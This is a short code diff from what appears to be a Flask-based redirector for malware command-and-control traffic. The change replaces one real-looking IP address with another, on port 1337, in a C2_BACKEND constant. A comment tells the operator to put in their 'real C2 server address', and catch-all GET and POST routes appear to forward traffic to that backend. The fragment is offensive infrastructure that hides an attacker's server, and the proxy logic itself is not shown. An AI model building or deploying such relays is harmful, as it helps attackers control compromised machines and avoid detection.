@@ -4,7 +4,7 @@ import requests
 app = Flask(__name__)
 
 # Change this to your real C2 server address (IP or domain)
-C2_BACKEND = "http://34.230.21.94"
+C2_BACKEND = "http://44.202.81.220:1337"
 
 @app.route('/', defaults={'path': ''}, methods=["GET", "POST"])
 @app.route('/<path:path>', methods=["GET", "POST"])
